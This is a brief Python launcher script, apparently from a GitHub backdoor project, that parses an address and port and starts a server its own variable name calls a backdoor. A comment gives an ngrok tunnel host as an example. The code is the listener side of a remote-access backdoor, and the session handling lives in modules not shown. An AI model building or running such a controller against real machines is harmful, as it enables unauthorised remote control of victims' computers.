#!/usr/bin/python3
# coding: utf-8

__author__ = '@zNairy'
__contact__ = 'Discord: __Nairy__#7181 | Github: https://github.com/zNairy/'
__version__ = '2.0'

from src.parserArguments import createSetupParser
from src.server import Server

def main():
    parser, args = createSetupParser()

    servidorBackdoor = Server(args.address, args.port) # Ex: server = Server('0.tcp.ngrok.io', 4321)#
    servidorBackdoor.run() # iniciando escuta e sessões #


if __name__ == '__main__':
    main()